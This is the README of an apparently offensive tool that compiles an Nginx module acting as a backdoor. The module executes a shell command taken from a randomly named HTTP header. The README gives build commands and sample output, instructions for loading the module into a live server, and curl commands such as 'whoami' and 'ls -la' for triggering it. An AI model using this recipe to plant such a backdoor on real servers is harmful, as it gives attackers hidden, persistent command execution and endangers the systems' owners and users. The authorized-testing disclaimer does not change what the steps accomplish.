# nginx-backdoor-mod

`nginx-backdoor-mod` is a penetration testing tool designed to create a custom Nginx module that adds a backdoor for executing system commands via HTTP headers. This tool is intended for authorized security testing to evaluate the security of Nginx-based web servers.

> **WARNING**: This tool is for **authorized security testing only**. Unauthorized use may violate laws and regulations. The author and contributors are not responsible for misuse. Always obtain explicit permission before testing any system.

## Features

- **Dynamic Nginx Module Creation**: Build a custom Nginx module with a specified name and backdoor header.
- **Command Execution via HTTP Headers**: Execute system commands on the server by sending a specific HTTP header.
- **Support for Multiple Nginx Versions**: Download and build against specified Nginx releases from `nginx.org`.
- **Dockerized Build Environment**: Use a Docker container to ensure consistent build dependencies.
- **List Available Nginx Releases**: Retrieve a list of available Nginx versions for module compilation.

## Installation

### Prerequisites

- **Docker**: Required to build the module in a consistent environment.
- **Bash**: For running the build scripts.
- **curl**: For downloading Nginx source code.

### Steps

- Build the docker environment with nginx mod build script:

```
$ ./build.sh
[...]
$ usage: build-nginx-backdoor-mod.sh [-l] [-r -n]

-l     list nginx releases
-r     choose release
-n     set name for the built nginx module
-h     print this help message and exit
```

## Usage

### Command-Line Flags

```
$ ./build.sh
[...]
$ usage: build-nginx-backdoor-mod.sh [-l] [-r -n]

-l     list nginx releases
-r     choose release
-n     set name for the built nginx module
-h     print this help message and exit
```

### Examples

#### List available Nginx releases

```
$ ./build-nginx-backdoor-mod.sh -l
[inf] releases provided by nginx.org
nginx-1.24.0.tar.gz
nginx-1.25.0.tar.gz
nginx-1.26.0.tar.gz
[...]
```

#### Build a backdoor module for Nginx 1.20.1

```
$ ./build.sh -r nginx-1.20.1.tar.gz -n test
[inf] downloading https://nginx.org/download/nginx-1.20.1.tar.gz
[inf] extracting nginx-1.20.1.tar.gz to /root/nginx-backdoor-mod
[inf] configure successful
[inf] successfully built test.so

[inf] output module "/root/nginx-backdoor-mod/test_v1.20.1_X-325901e0f4512f4c22a43a6eb455ae0b.so"
[inf] use "X-325901e0f4512f4c22a43a6eb455ae0b" for backdoor authentication + command execution
[inf] example: curl http://localhost -H 'X-325901e0f4512f4c22a43a6eb455ae0b: ls -la'
[inf] enable with nginx module config in /etc/nginx/modules-enabled and "load_module /path/to/test.so;"
[inf] enable with the main nginx config in /etc/nginx/nginx.conf and "load_module /path/to/test.so;"
```

#### Deploy the module

- Copy the generated `.so` file (e.g., `test_v1.20.1_X-<random>.so`) to your Nginx server’s modules directory (e.g., `/usr/lib/nginx/modules/`).

- Add the module to your Nginx configuration in `/etc/nginx/nginx.conf` or a file in `/etc/nginx/modules-enabled/`:

```
load_module /usr/lib/nginx/modules/test_v1.20.1.so;
```

- Reload or restart Nginx:

```
$ nginx -s reload
$ systemctl restart nginx
```

- Test the backdoor by sending a command via the specified header:

```
$ curl http://localhost -H 'X-<random>: whoami'
```

## Technical Details

- **Docker Build**: The tool uses a Dockerfile to create an Ubuntu-based environment with dependencies (`build-essential`, `libpcre3`, `zlib1g`, `libssl-dev`, `curl`).
- **Module Template**: The `ngx_mod_template/` directory contains a `config` file and `ngx_mod_template.c`, which are modified during the build to set the module name and backdoor header.
- **Backdoor Mechanism**: The module checks for a specific HTTP header (randomly generated during the build) and executes its value as a shell command using `/bin/sh`.
- **Output**: The compiled module is saved as `<name>_v<version>_<header>.so` in the `nginx-backdoor-mod/` directory.

## License

This project is licensed under the GNU GENERAL PUBLIC LICENSE. See the LICENSE file for details.

## Disclaimer

`nginx-backdoor-mod` is provided "as is" without warranty. The author and contributors are not liable for any damages or legal consequences arising from its use. Use responsibly and only in authorized environments.
